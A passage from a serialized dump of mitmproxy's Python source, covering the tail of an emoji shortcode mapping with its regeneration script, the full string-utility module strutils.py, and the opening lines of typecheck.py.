\":speech_balloon:\": \"\ud83d\udcac\",\n    \":speedboat:\": \"\ud83d\udea4\",\n    \":spider:\": \"\ud83d\udd77\",\n    \":spider_web:\": \"\ud83d\udd78\",\n    \":spiral_calendar:\": \"\ud83d\uddd3\",\n    \":spiral_notepad:\": \"\ud83d\uddd2\",\n    \":sponge:\": \"\ud83e\uddfd\",\n    \":spoon:\": \"\ud83e\udd44\",\n    \":squid:\": \"\ud83e\udd91\",\n    \":sri_lanka:\": \"\ud83c\uddf1\u200d\ud83c\uddf0\",\n    \":st_barthelemy:\": \"\ud83c\udde7\u200d\ud83c\uddf1\",\n    \":st_helena:\": \"\ud83c\uddf8\u200d\ud83c\udded\",\n    \":st_kitts_nevis:\": \"\ud83c\uddf0\u200d\ud83c\uddf3\",\n    \":st_lucia:\": \"\ud83c\uddf1\u200d\ud83c\udde8\",\n    \":st_martin:\": \"\ud83c\uddf2\u200d\ud83c\uddeb\",\n    \":st_pierre_miquelon:\": \"\ud83c\uddf5\u200d\ud83c\uddf2\",\n    \":st_vincent_grenadines:\": \"\ud83c\uddfb\u200d\ud83c\udde8\",\n    \":stadium:\": \"\ud83c\udfdf\",\n    \":standing_man:\": \"\ud83e\uddcd\u200d\u2642\",\n    \":standing_person:\": \"\ud83e\uddcd\",\n    \":standing_woman:\": \"\ud83e\uddcd\u200d\u2640\",\n    \":star:\": \"\u2b50\",\n    \":star2:\": \"\ud83c\udf1f\",\n    \":star_and_crescent:\": \"\u262a\",\n    \":star_of_david:\": \"\u2721\",\n    \":star_struck:\": \"\ud83e\udd29\",\n    \":stars:\": \"\ud83c\udf20\",\n    \":station:\": \"\ud83d\ude89\",\n    \":statue_of_liberty:\": \"\ud83d\uddfd\",\n    \":steam_locomotive:\": \"\ud83d\ude82\",\n    \":stethoscope:\": \"\ud83e\ude7a\",\n    \":stew:\": \"\ud83c\udf72\",\n    \":stop_button:\": \"\u23f9\",\n    \":stop_sign:\": \"\ud83d\uded1\",\n    \":stopwatch:\": \"\u23f1\",\n    \":straight_ruler:\": \"\ud83d\udccf\",\n    \":strawberry:\": \"\ud83c\udf53\",\n    \":stuck_out_tongue:\": \"\ud83d\ude1b\",\n    \":stuck_out_tongue_closed_eyes:\": \"\ud83d\ude1d\",\n    \":stuck_out_tongue_winking_eye:\": \"\ud83d\ude1c\",\n    \":student:\": \"\ud83e\uddd1\u200d\ud83c\udf93\",\n    \":studio_microphone:\": \"\ud83c\udf99\",\n    \":stuffed_flatbread:\": \"\ud83e\udd59\",\n    \":sudan:\": \"\ud83c\uddf8\u200d\ud83c\udde9\",\n    \":sun_behind_large_cloud:\": \"\ud83c\udf25\",\n    \":sun_behind_rain_cloud:\": \"\ud83c\udf26\",\n    \":sun_behind_small_cloud:\": \"\ud83c\udf24\",\n    \":sun_with_face:\": \"\ud83c\udf1e\",\n    \":sunflower:\": \"\ud83c\udf3b\",\n    \":sunglasses:\": \"\ud83d\ude0e\",\n    \":sunny:\": \"\u2600\",\n    \":sunrise:\": \"\ud83c\udf05\",\n    \":sunrise_over_mountains:\": \"\ud83c\udf04\",\n    \":superhero:\": \"\ud83e\uddb8\",\n    \":superhero_man:\": \"\ud83e\uddb8\u200d\u2642\",\n    \":superhero_woman:\": \"\ud83e\uddb8\u200d\u2640\",\n    \":supervillain:\": \"\ud83e\uddb9\",\n    \":supervillain_man:\": \"\ud83e\uddb9\u200d\u2642\",\n    \":supervillain_woman:\": \"\ud83e\uddb9\u200d\u2640\",\n    \":surfer:\": \"\ud83c\udfc4\",\n    \":surfing_man:\": \"\ud83c\udfc4\u200d\u2642\",\n    \":surfing_woman:\": \"\ud83c\udfc4\u200d\u2640\",\n    \":suriname:\": \"\ud83c\uddf8\u200d\ud83c\uddf7\",\n    \":sushi:\": \"\ud83c\udf63\",\n    \":suspension_railway:\": \"\ud83d\ude9f\",\n    \":svalbard_jan_mayen:\": \"\ud83c\uddf8\u200d\ud83c\uddef\",\n    \":swan:\": \"\ud83e\udda2\",\n    \":swaziland:\": \"\ud83c\uddf8\u200d\ud83c\uddff\",\n    \":sweat:\": \"\ud83d\ude13\",\n    \":sweat_drops:\": \"\ud83d\udca6\",\n    \":sweat_smile:\": \"\ud83d\ude05\",\n    \":sweden:\": \"\ud83c\uddf8\u200d\ud83c\uddea\",\n    \":sweet_potato:\": \"\ud83c\udf60\",\n    \":swim_brief:\": \"\ud83e\ude72\",\n    \":swimmer:\": \"\ud83c\udfca\",\n    \":swimming_man:\": \"\ud83c\udfca\u200d\u2642\",\n    \":swimming_woman:\": \"\ud83c\udfca\u200d\u2640\",\n    \":switzerland:\": \"\ud83c\udde8\u200d\ud83c\udded\",\n    \":symbols:\": \"\ud83d\udd23\",\n    \":synagogue:\": \"\ud83d\udd4d\",\n    \":syria:\": \"\ud83c\uddf8\u200d\ud83c\uddfe\",\n    \":syringe:\": \"\ud83d\udc89\",\n    \":t-rex:\": \"\ud83e\udd96\",\n    \":taco:\": \"\ud83c\udf2e\",\n    \":tada:\": \"\ud83c\udf89\",\n    \":taiwan:\": \"\ud83c\uddf9\u200d\ud83c\uddfc\",\n    \":tajikistan:\": \"\ud83c\uddf9\u200d\ud83c\uddef\",\n    \":takeout_box:\": \"\ud83e\udd61\",\n    \":tanabata_tree:\": \"\ud83c\udf8b\",\n    \":tangerine:\": \"\ud83c\udf4a\",\n    \":tanzania:\": \"\ud83c\uddf9\u200d\ud83c\uddff\",\n    \":taurus:\": \"\u2649\",\n    \":taxi:\": \"\ud83d\ude95\",\n    \":tea:\": \"\ud83c\udf75\",\n    \":teacher:\": \"\ud83e\uddd1\u200d\ud83c\udfeb\",\n    \":technologist:\": \"\ud83e\uddd1\u200d\ud83d\udcbb\",\n    \":teddy_bear:\": \"\ud83e\uddf8\",\n    \":telephone:\": \"\u260e\",\n    \":telephone_receiver:\": \"\ud83d\udcde\",\n    \":telescope:\": \"\ud83d\udd2d\",\n    \":tennis:\": \"\ud83c\udfbe\",\n    \":tent:\": \"\u26fa\",\n    \":test_tube:\": \"\ud83e\uddea\",\n    \":thailand:\": \"\ud83c\uddf9\u200d\ud83c\udded\",\n    \":thermometer:\": \"\ud83c\udf21\",\n    \":thinking:\": \"\ud83e\udd14\",\n    \":thought_balloon:\": \"\ud83d\udcad\",\n    \":thread:\": \"\ud83e\uddf5\",\n    \":three:\": \"3\u200d\u20e3\",\n    \":thumbsdown:\": \"\ud83d\udc4e\",\n    \":thumbsup:\": \"\ud83d\udc4d\",\n    \":ticket:\": \"\ud83c\udfab\",\n    \":tickets:\": \"\ud83c\udf9f\",\n    \":tiger:\": \"\ud83d\udc2f\",\n    \":tiger2:\": \"\ud83d\udc05\",\n    \":timer_clock:\": \"\u23f2\",\n    \":timor_leste:\": \"\ud83c\uddf9\u200d\ud83c\uddf1\",\n    \":tipping_hand_man:\": \"\ud83d\udc81\u200d\u2642\",\n    \":tipping_hand_person:\": \"\ud83d\udc81\",\n    \":tipping_hand_woman:\": \"\ud83d\udc81\u200d\u2640\",\n    \":tired_face:\": \"\ud83d\ude2b\",\n    \":tm:\": \"\u2122\",\n    \":togo:\": \"\ud83c\uddf9\u200d\ud83c\uddec\",\n    \":toilet:\": \"\ud83d\udebd\",\n    \":tokelau:\": \"\ud83c\uddf9\u200d\ud83c\uddf0\",\n    \":tokyo_tower:\": \"\ud83d\uddfc\",\n    \":tomato:\": \"\ud83c\udf45\",\n    \":tonga:\": \"\ud83c\uddf9\u200d\ud83c\uddf4\",\n    \":tongue:\": \"\ud83d\udc45\",\n    \":toolbox:\": \"\ud83e\uddf0\",\n    \":tooth:\": \"\ud83e\uddb7\",\n    \":top:\": \"\ud83d\udd1d\",\n    \":tophat:\": \"\ud83c\udfa9\",\n    \":tornado:\": \"\ud83c\udf2a\",\n    \":tr:\": \"\ud83c\uddf9\u200d\ud83c\uddf7\",\n    \":trackball:\": \"\ud83d\uddb2\",\n    \":tractor:\": \"\ud83d\ude9c\",\n    \":traffic_light:\": \"\ud83d\udea5\",\n    \":train:\": \"\ud83d\ude8b\",\n    \":train2:\": \"\ud83d\ude86\",\n    \":tram:\": \"\ud83d\ude8a\",\n    \":triangular_flag_on_post:\": \"\ud83d\udea9\",\n    \":triangular_ruler:\": \"\ud83d\udcd0\",\n    \":trident:\": \"\ud83d\udd31\",\n    \":trinidad_tobago:\": \"\ud83c\uddf9\u200d\ud83c\uddf9\",\n    \":tristan_da_cunha:\": \"\ud83c\uddf9\u200d\ud83c\udde6\",\n    \":triumph:\": \"\ud83d\ude24\",\n    \":trolleybus:\": \"\ud83d\ude8e\",\n    \":trophy:\": \"\ud83c\udfc6\",\n    \":tropical_drink:\": \"\ud83c\udf79\",\n    \":tropical_fish:\": \"\ud83d\udc20\",\n    \":truck:\": \"\ud83d\ude9a\",\n    \":trumpet:\": \"\ud83c\udfba\",\n    \":tshirt:\": \"\ud83d\udc55\",\n    \":tulip:\": \"\ud83c\udf37\",\n    \":tumbler_glass:\": \"\ud83e\udd43\",\n    \":tunisia:\": \"\ud83c\uddf9\u200d\ud83c\uddf3\",\n    \":turkey:\": \"\ud83e\udd83\",\n    \":turkmenistan:\": \"\ud83c\uddf9\u200d\ud83c\uddf2\",\n    \":turks_caicos_islands:\": \"\ud83c\uddf9\u200d\ud83c\udde8\",\n    \":turtle:\": \"\ud83d\udc22\",\n    \":tuvalu:\": \"\ud83c\uddf9\u200d\ud83c\uddfb\",\n    \":tv:\": \"\ud83d\udcfa\",\n    \":twisted_rightwards_arrows:\": \"\ud83d\udd00\",\n    \":two:\": \"2\u200d\u20e3\",\n    \":two_hearts:\": \"\ud83d\udc95\",\n    \":two_men_holding_hands:\": \"\ud83d\udc6c\",\n    \":two_women_holding_hands:\": \"\ud83d\udc6d\",\n    \":u5272:\": \"\ud83c\ude39\",\n    \":u5408:\": \"\ud83c\ude34\",\n    \":u55b6:\": \"\ud83c\ude3a\",\n    \":u6307:\": \"\ud83c\ude2f\",\n    \":u6708:\": \"\ud83c\ude37\",\n    \":u6709:\": \"\ud83c\ude36\",\n    \":u6e80:\": \"\ud83c\ude35\",\n    \":u7121:\": \"\ud83c\ude1a\",\n    \":u7533:\": \"\ud83c\ude38\",\n    \":u7981:\": \"\ud83c\ude32\",\n    \":u7a7a:\": \"\ud83c\ude33\",\n    \":uganda:\": \"\ud83c\uddfa\u200d\ud83c\uddec\",\n    \":uk:\": \"\ud83c\uddec\u200d\ud83c\udde7\",\n    \":ukraine:\": \"\ud83c\uddfa\u200d\ud83c\udde6\",\n    \":umbrella:\": \"\u2614\",\n    \":unamused:\": \"\ud83d\ude12\",\n    \":underage:\": \"\ud83d\udd1e\",\n    \":unicorn:\": \"\ud83e\udd84\",\n    \":united_arab_emirates:\": \"\ud83c\udde6\u200d\ud83c\uddea\",\n    \":united_nations:\": \"\ud83c\uddfa\u200d\ud83c\uddf3\",\n    \":unlock:\": \"\ud83d\udd13\",\n    \":up:\": \"\ud83c\udd99\",\n    \":upside_down_face:\": \"\ud83d\ude43\",\n    \":uruguay:\": \"\ud83c\uddfa\u200d\ud83c\uddfe\",\n    \":us:\": \"\ud83c\uddfa\u200d\ud83c\uddf8\",\n    \":us_outlying_islands:\": \"\ud83c\uddfa\u200d\ud83c\uddf2\",\n    \":us_virgin_islands:\": \"\ud83c\uddfb\u200d\ud83c\uddee\",\n    \":uzbekistan:\": \"\ud83c\uddfa\u200d\ud83c\uddff\",\n    \":v:\": \"\u270c\",\n    \":vampire:\": \"\ud83e\udddb\",\n    \":vampire_man:\": \"\ud83e\udddb\u200d\u2642\",\n    \":vampire_woman:\": \"\ud83e\udddb\u200d\u2640\",\n    \":vanuatu:\": \"\ud83c\uddfb\u200d\ud83c\uddfa\",\n    \":vatican_city:\": \"\ud83c\uddfb\u200d\ud83c\udde6\",\n    \":venezuela:\": \"\ud83c\uddfb\u200d\ud83c\uddea\",\n    \":vertical_traffic_light:\": \"\ud83d\udea6\",\n    \":vhs:\": \"\ud83d\udcfc\",\n    \":vibration_mode:\": \"\ud83d\udcf3\",\n    \":video_camera:\": \"\ud83d\udcf9\",\n    \":video_game:\": \"\ud83c\udfae\",\n    \":vietnam:\": \"\ud83c\uddfb\u200d\ud83c\uddf3\",\n    \":violin:\": \"\ud83c\udfbb\",\n    \":virgo:\": \"\u264d\",\n    \":volcano:\": \"\ud83c\udf0b\",\n    \":volleyball:\": \"\ud83c\udfd0\",\n    \":vomiting_face:\": \"\ud83e\udd2e\",\n    \":vs:\": \"\ud83c\udd9a\",\n    \":vulcan_salute:\": \"\ud83d\udd96\",\n    \":waffle:\": \"\ud83e\uddc7\",\n    \":wales:\": \"\ud83c\udff4\u200d\udb40\udc67\u200d\udb40\udc62\u200d\udb40\udc77\u200d\udb40\udc6c\u200d\udb40\udc73\u200d\udb40\udc7f\",\n    \":walking:\": \"\ud83d\udeb6\",\n    \":walking_man:\": \"\ud83d\udeb6\u200d\u2642\",\n    \":walking_woman:\": \"\ud83d\udeb6\u200d\u2640\",\n    \":wallis_futuna:\": \"\ud83c\uddfc\u200d\ud83c\uddeb\",\n    \":waning_crescent_moon:\": \"\ud83c\udf18\",\n    \":waning_gibbous_moon:\": \"\ud83c\udf16\",\n    \":warning:\": \"\u26a0\",\n    \":wastebasket:\": \"\ud83d\uddd1\",\n    \":watch:\": \"\u231a\",\n    \":water_buffalo:\": \"\ud83d\udc03\",\n    \":water_polo:\": \"\ud83e\udd3d\",\n    \":watermelon:\": \"\ud83c\udf49\",\n    \":wave:\": \"\ud83d\udc4b\",\n    \":wavy_dash:\": \"\u3030\",\n    \":waxing_crescent_moon:\": \"\ud83c\udf12\",\n    \":waxing_gibbous_moon:\": \"\ud83c\udf14\",\n    \":wc:\": \"\ud83d\udebe\",\n    \":weary:\": \"\ud83d\ude29\",\n    \":wedding:\": \"\ud83d\udc92\",\n    \":weight_lifting:\": \"\ud83c\udfcb\",\n    \":weight_lifting_man:\": \"\ud83c\udfcb\u200d\u2642\",\n    \":weight_lifting_woman:\": \"\ud83c\udfcb\u200d\u2640\",\n    \":western_sahara:\": \"\ud83c\uddea\u200d\ud83c\udded\",\n    \":whale:\": \"\ud83d\udc33\",\n    \":whale2:\": \"\ud83d\udc0b\",\n    \":wheel_of_dharma:\": \"\u2638\",\n    \":wheelchair:\": \"\u267f\",\n    \":white_check_mark:\": \"\u2705\",\n    \":white_circle:\": \"\u26aa\",\n    \":white_flag:\": \"\ud83c\udff3\",\n    \":white_flower:\": \"\ud83d\udcae\",\n    \":white_haired_man:\": \"\ud83d\udc68\u200d\ud83e\uddb3\",\n    \":white_haired_woman:\": \"\ud83d\udc69\u200d\ud83e\uddb3\",\n    \":white_heart:\": \"\ud83e\udd0d\",\n    \":white_large_square:\": \"\u2b1c\",\n    \":white_medium_small_square:\": \"\u25fd\",\n    \":white_medium_square:\": \"\u25fb\",\n    \":white_small_square:\": \"\u25ab\",\n    \":white_square_button:\": \"\ud83d\udd33\",\n    \":wilted_flower:\": \"\ud83e\udd40\",\n    \":wind_chime:\": \"\ud83c\udf90\",\n    \":wind_face:\": \"\ud83c\udf2c\",\n    \":wine_glass:\": \"\ud83c\udf77\",\n    \":wink:\": \"\ud83d\ude09\",\n    \":wolf:\": \"\ud83d\udc3a\",\n    \":woman:\": \"\ud83d\udc69\",\n    \":woman_artist:\": \"\ud83d\udc69\u200d\ud83c\udfa8\",\n    \":woman_astronaut:\": \"\ud83d\udc69\u200d\ud83d\ude80\",\n    \":woman_cartwheeling:\": \"\ud83e\udd38\u200d\u2640\",\n    \":woman_cook:\": \"\ud83d\udc69\u200d\ud83c\udf73\",\n    \":woman_dancing:\": \"\ud83d\udc83\",\n    \":woman_facepalming:\": \"\ud83e\udd26\u200d\u2640\",\n    \":woman_factory_worker:\": \"\ud83d\udc69\u200d\ud83c\udfed\",\n    \":woman_farmer:\": \"\ud83d\udc69\u200d\ud83c\udf3e\",\n    \":woman_firefighter:\": \"\ud83d\udc69\u200d\ud83d\ude92\",\n    \":woman_health_worker:\": \"\ud83d\udc69\u200d\u2695\",\n    \":woman_in_manual_wheelchair:\": \"\ud83d\udc69\u200d\ud83e\uddbd\",\n    \":woman_in_motorized_wheelchair:\": \"\ud83d\udc69\u200d\ud83e\uddbc\",\n    \":woman_judge:\": \"\ud83d\udc69\u200d\u2696\",\n    \":woman_juggling:\": \"\ud83e\udd39\u200d\u2640\",\n    \":woman_mechanic:\": \"\ud83d\udc69\u200d\ud83d\udd27\",\n    \":woman_office_worker:\": \"\ud83d\udc69\u200d\ud83d\udcbc\",\n    \":woman_pilot:\": \"\ud83d\udc69\u200d\u2708\",\n    \":woman_playing_handball:\": \"\ud83e\udd3e\u200d\u2640\",\n    \":woman_playing_water_polo:\": \"\ud83e\udd3d\u200d\u2640\",\n    \":woman_scientist:\": \"\ud83d\udc69\u200d\ud83d\udd2c\",\n    \":woman_shrugging:\": \"\ud83e\udd37\u200d\u2640\",\n    \":woman_singer:\": \"\ud83d\udc69\u200d\ud83c\udfa4\",\n    \":woman_student:\": \"\ud83d\udc69\u200d\ud83c\udf93\",\n    \":woman_teacher:\": \"\ud83d\udc69\u200d\ud83c\udfeb\",\n    \":woman_technologist:\": \"\ud83d\udc69\u200d\ud83d\udcbb\",\n    \":woman_with_headscarf:\": \"\ud83e\uddd5\",\n    \":woman_with_probing_cane:\": \"\ud83d\udc69\u200d\ud83e\uddaf\",\n    \":woman_with_turban:\": \"\ud83d\udc73\u200d\u2640\",\n    \":womans_clothes:\": \"\ud83d\udc5a\",\n    \":womans_hat:\": \"\ud83d\udc52\",\n    \":women_wrestling:\": \"\ud83e\udd3c\u200d\u2640\",\n    \":womens:\": \"\ud83d\udeba\",\n    \":woozy_face:\": \"\ud83e\udd74\",\n    \":world_map:\": \"\ud83d\uddfa\",\n    \":worried:\": \"\ud83d\ude1f\",\n    \":wrench:\": \"\ud83d\udd27\",\n    \":wrestling:\": \"\ud83e\udd3c\",\n    \":writing_hand:\": \"\u270d\",\n    \":x:\": \"\u274c\",\n    \":yarn:\": \"\ud83e\uddf6\",\n    \":yawning_face:\": \"\ud83e\udd71\",\n    \":yellow_circle:\": \"\ud83d\udfe1\",\n    \":yellow_heart:\": \"\ud83d\udc9b\",\n    \":yellow_square:\": \"\ud83d\udfe8\",\n    \":yemen:\": \"\ud83c\uddfe\u200d\ud83c\uddea\",\n    \":yen:\": \"\ud83d\udcb4\",\n    \":yin_yang:\": \"\u262f\",\n    \":yo_yo:\": \"\ud83e\ude80\",\n    \":yum:\": \"\ud83d\ude0b\",\n    \":zambia:\": \"\ud83c\uddff\u200d\ud83c\uddf2\",\n    \":zany_face:\": \"\ud83e\udd2a\",\n    \":zap:\": \"\u26a1\",\n    \":zebra:\": \"\ud83e\udd93\",\n    \":zero:\": \"0\u200d\u20e3\",\n    \":zimbabwe:\": \"\ud83c\uddff\u200d\ud83c\uddfc\",\n    \":zipper_mouth_face:\": \"\ud83e\udd10\",\n    \":zombie:\": \"\ud83e\udddf\",\n    \":zombie_man:\": \"\ud83e\udddf\u200d\u2642\",\n    \":zombie_woman:\": \"\ud83e\udddf\u200d\u2640\",\n    \":zzz:\": \"\ud83d\udca4\",\n    \":default:\": \"\u25cf\",\n    \"a\": \"a\",\n    \"b\": \"b\",\n    \"c\": \"c\",\n    \"d\": \"d\",\n    \"e\": \"e\",\n    \"f\": \"f\",\n    \"g\": \"g\",\n    \"h\": \"h\",\n    \"i\": \"i\",\n    \"j\": \"j\",\n    \"k\": \"k\",\n    \"l\": \"l\",\n    \"m\": \"m\",\n    \"n\": \"n\",\n    \"o\": \"o\",\n    \"p\": \"p\",\n    \"q\": \"q\",\n    \"r\": \"r\",\n    \"s\": \"s\",\n    \"t\": \"t\",\n    \"u\": \"u\",\n    \"v\": \"v\",\n    \"w\": \"w\",\n    \"x\": \"x\",\n    \"y\": \"y\",\n    \"z\": \"z\",\n    \"A\": \"A\",\n    \"B\": \"B\",\n    \"C\": \"C\",\n    \"D\": \"D\",\n    \"E\": \"E\",\n    \"F\": \"F\",\n    \"G\": \"G\",\n    \"H\": \"H\",\n    \"I\": \"I\",\n    \"J\": \"J\",\n    \"K\": \"K\",\n    \"L\": \"L\",\n    \"M\": \"M\",\n    \"N\": \"N\",\n    \"O\": \"O\",\n    \"P\": \"P\",\n    \"Q\": \"Q\",\n    \"R\": \"R\",\n    \"S\": \"S\",\n    \"T\": \"T\",\n    \"U\": \"U\",\n    \"V\": \"V\",\n    \"W\": \"W\",\n    \"X\": \"X\",\n    \"Y\": \"Y\",\n    \"Z\": \"Z\",\n    \"0\": \"0\",\n    \"1\": \"1\",\n    \"2\": \"2\",\n    \"3\": \"3\",\n    \"4\": \"4\",\n    \"5\": \"5\",\n    \"6\": \"6\",\n    \"7\": \"7\",\n    \"8\": \"8\",\n    \"9\": \"9\",\n}\n\n\nif __name__ == \"__main__\":  # pragma: no cover\n    import io\n    import re\n    import string\n    from pathlib import Path\n\n    import requests\n\n    from mitmproxy.tools.console.common import SYMBOL_MARK\n\n    CHAR_MARKERS = list(string.ascii_letters) + list(string.digits)\n    EMOJI_SRC = '    \":{name}:\": \"{emoji_val}\",'\n    CHAR_SRC = '    \"{name}\": \"{emoji_val}\",'\n\n    out = io.StringIO()\n\n    r = requests.get(\"https://api.github.com/emojis\")\n    for name, url in r.json().items():\n        codepoints = url.rpartition(\"/\")[2].partition(\".png\")[0].split(\"-\")\n        try:\n            emoji_val = \"\\u200d\".join(chr(int(c, 16)) for c in codepoints)\n        except ValueError:\n            continue  # some GitHub-specific emojis, e.g. \"atom\".\n        print(EMOJI_SRC.format(name=name, emoji_val=emoji_val), file=out)\n\n    # add the default marker\n    print(EMOJI_SRC.format(name=\"default\", emoji_val=SYMBOL_MARK), file=out)\n\n    for c in CHAR_MARKERS:\n        print(CHAR_SRC.format(name=c, emoji_val=c), file=out)\n\n    Path(__file__).write_text(\n        re.sub(\n            r\"(?<={\\n)[\\s\\S]*(?=}\\n)\",\n            lambda x: out.getvalue(),\n            Path(__file__).read_text(\"utf8\"),\n            1,\n        ),\n        \"utf8\",\n    )\n", "mitmproxy/utils/strutils.py": "import codecs\nimport io\nimport re\nfrom collections.abc import Iterable\nfrom typing import overload\n\n# https://mypy.readthedocs.io/en/stable/more_types.html#function-overloading\n\n\n@overload\ndef always_bytes(str_or_bytes: None, *encode_args) -> None: ...\n\n\n@overload\ndef always_bytes(str_or_bytes: str | bytes, *encode_args) -> bytes: ...\n\n\ndef always_bytes(str_or_bytes: None | str | bytes, *encode_args) -> None | bytes:\n    if str_or_bytes is None or isinstance(str_or_bytes, bytes):\n        return str_or_bytes\n    elif isinstance(str_or_bytes, str):\n        return str_or_bytes.encode(*encode_args)\n    else:\n        raise TypeError(\n            f\"Expected str or bytes, but got {type(str_or_bytes).__name__}.\"\n        )\n\n\n@overload\ndef always_str(str_or_bytes: None, *encode_args) -> None: ...\n\n\n@overload\ndef always_str(str_or_bytes: str | bytes, *encode_args) -> str: ...\n\n\ndef always_str(str_or_bytes: None | str | bytes, *decode_args) -> None | str:\n    \"\"\"\n    Returns,\n        str_or_bytes unmodified, if\n    \"\"\"\n    if str_or_bytes is None or isinstance(str_or_bytes, str):\n        return str_or_bytes\n    elif isinstance(str_or_bytes, bytes):\n        return str_or_bytes.decode(*decode_args)\n    else:\n        raise TypeError(\n            f\"Expected str or bytes, but got {type(str_or_bytes).__name__}.\"\n        )\n\n\n# Translate control characters to \"safe\" characters. This implementation\n# initially replaced them with the matching control pictures\n# (http://unicode.org/charts/PDF/U2400.pdf), but that turned out to render badly\n# with monospace fonts. We are back to \".\" therefore.\n_control_char_trans = {\n    x: ord(\".\")\n    for x in range(32)  # x + 0x2400 for unicode control group pictures\n}\n_control_char_trans[127] = ord(\".\")  # 0x2421\n_control_char_trans_newline = _control_char_trans.copy()\nfor x in (\"\\r\", \"\\n\", \"\\t\"):\n    del _control_char_trans_newline[ord(x)]\n\n_control_char_trans = str.maketrans(_control_char_trans)\n_control_char_trans_newline = str.maketrans(_control_char_trans_newline)\n\n\ndef escape_control_characters(text: str, keep_spacing=True) -> str:\n    \"\"\"\n    Replace all unicode C1 control characters from the given text with a single \".\"\n\n    Args:\n        keep_spacing: If True, tabs and newlines will not be replaced.\n    \"\"\"\n    if not isinstance(text, str):\n        raise ValueError(f\"text type must be unicode but is {type(text).__name__}\")\n\n    trans = _control_char_trans_newline if keep_spacing else _control_char_trans\n    return text.translate(trans)\n\n\ndef bytes_to_escaped_str(\n    data: bytes, keep_spacing: bool = False, escape_single_quotes: bool = False\n) -> str:\n    \"\"\"\n    Take bytes and return a safe string that can be displayed to the user.\n\n    Single quotes are always escaped, double quotes are never escaped:\n        \"'\" + bytes_to_escaped_str(...) + \"'\"\n    gives a valid Python string.\n\n    Args:\n        keep_spacing: If True, tabs and newlines will not be escaped.\n    \"\"\"\n\n    if not isinstance(data, bytes):\n        raise ValueError(f\"data must be bytes, but is {data.__class__.__name__}\")\n    # We always insert a double-quote here so that we get a single-quoted string back\n    # https://stackoverflow.com/questions/29019340/why-does-python-use-different-quotes-for-representing-strings-depending-on-their\n    ret = repr(b'\"' + data).lstrip(\"b\")[2:-1]\n    if not escape_single_quotes:\n        ret = re.sub(r\"(?<!\\\\)(\\\\\\\\)*\\\\'\", lambda m: (m.group(1) or \"\") + \"'\", ret)\n    if keep_spacing:\n        ret = re.sub(\n            r\"(?<!\\\\)(\\\\\\\\)*\\\\([nrt])\",\n            lambda m: (m.group(1) or \"\") + dict(n=\"\\n\", r=\"\\r\", t=\"\\t\")[m.group(2)],\n            ret,\n        )\n    return ret\n\n\ndef escaped_str_to_bytes(data: str) -> bytes:\n    \"\"\"\n    Take an escaped string and return the unescaped bytes equivalent.\n\n    Raises:\n        ValueError, if the escape sequence is invalid.\n    \"\"\"\n    if not isinstance(data, str):\n        raise ValueError(f\"data must be str, but is {data.__class__.__name__}\")\n\n    # This one is difficult - we use an undocumented Python API here\n    # as per http://stackoverflow.com/a/23151714/934719\n    return codecs.escape_decode(data)[0]  # type: ignore\n\n\ndef is_mostly_bin(s: bytes) -> bool:\n    if not s or len(s) == 0:\n        return False\n\n    return sum(i < 9 or 13 < i < 32 or 126 < i for i in s[:100]) / len(s[:100]) > 0.3\n\n\ndef is_xml(s: bytes) -> bool:\n    for char in s:\n        if char in (9, 10, 32):  # is space?\n            continue\n        return char == 60  # is a \"<\"?\n    return False\n\n\ndef clean_hanging_newline(t):\n    \"\"\"\n    Many editors will silently add a newline to the final line of a\n    document (I'm looking at you, Vim). This function fixes this common\n    problem at the risk of removing a hanging newline in the rare cases\n    where the user actually intends it.\n    \"\"\"\n    if t and t[-1] == \"\\n\":\n        return t[:-1]\n    return t\n\n\ndef hexdump(s):\n    \"\"\"\n    Returns:\n        A generator of (offset, hex, str) tuples\n    \"\"\"\n    for i in range(0, len(s), 16):\n        offset = f\"{i:0=10x}\"\n        part = s[i : i + 16]\n        x = \" \".join(f\"{i:0=2x}\" for i in part)\n        x = x.ljust(47)  # 16*2 + 15\n        part_repr = always_str(\n            escape_control_characters(\n                part.decode(\"ascii\", \"replace\").replace(\"\\ufffd\", \".\"), False\n            )\n        )\n        yield (offset, x, part_repr)\n\n\ndef _move_to_private_code_plane(matchobj):\n    return chr(ord(matchobj.group(0)) + 0xE000)\n\n\ndef _restore_from_private_code_plane(matchobj):\n    return chr(ord(matchobj.group(0)) - 0xE000)\n\n\nNO_ESCAPE = r\"(?<!\\\\)(?:\\\\\\\\)*\"\nMULTILINE_CONTENT = r\"[\\s\\S]*?\"\nSINGLELINE_CONTENT = r\".*?\"\nMULTILINE_CONTENT_LINE_CONTINUATION = r\"(?:.|(?<=\\\\)\\n)*?\"\n\n\ndef split_special_areas(\n    data: str,\n    area_delimiter: Iterable[str],\n):\n    \"\"\"\n    Split a string of code into a [code, special area, code, special area, ..., code] list.\n\n    For example,\n\n    >>> split_special_areas(\n    >>>     \"test /* don't modify me */ foo\",\n    >>>     [r\"/\\\\*[\\\\s\\\\S]*?\\\\*/\"])  # (regex matching comments)\n    [\"test \", \"/* don't modify me */\", \" foo\"]\n\n    \"\".join(split_special_areas(x, ...)) == x always holds true.\n    \"\"\"\n    return re.split(\"({})\".format(\"|\".join(area_delimiter)), data, flags=re.MULTILINE)\n\n\ndef escape_special_areas(\n    data: str,\n    area_delimiter: Iterable[str],\n    control_characters,\n):\n    \"\"\"\n    Escape all control characters present in special areas with UTF8 symbols\n    in the private use plane (U+E000 t+ ord(char)).\n    This is useful so that one can then use regex replacements on the resulting string without\n    interfering with special areas.\n\n    control_characters must be 0 < ord(x) < 256.\n\n    Example:\n\n    >>> print(x)\n    if (true) { console.log('{}'); }\n    >>> x = escape_special_areas(x, \"{\", [\"'\" + SINGLELINE_CONTENT + \"'\"])\n    >>> print(x)\n    if (true) { console.log('\ufffd}'); }\n    >>> x = re.sub(r\"\\\\s*{\\\\s*\", \" {\\n    \", x)\n    >>> x = unescape_special_areas(x)\n    >>> print(x)\n    if (true) {\n        console.log('{}'); }\n    \"\"\"\n    buf = io.StringIO()\n    parts = split_special_areas(data, area_delimiter)\n    rex = re.compile(rf\"[{control_characters}]\")\n    for i, x in enumerate(parts):\n        if i % 2:\n            x = rex.sub(_move_to_private_code_plane, x)\n        buf.write(x)\n    return buf.getvalue()\n\n\ndef unescape_special_areas(data: str):\n    \"\"\"\n    Invert escape_special_areas.\n\n    x == unescape_special_areas(escape_special_areas(x)) always holds true.\n    \"\"\"\n    return re.sub(r\"[\\ue000-\\ue0ff]\", _restore_from_private_code_plane, data)\n", "mitmproxy/utils/typecheck.py": "import typing\nfrom collections import abc\n\ntry:\n    from types import UnionType\nexcept ImportError:  # pragma: no cover\n    UnionType = object()  # type: ignore\n\nType = typing.Union[\n    typing.Any  # anything more elaborate really 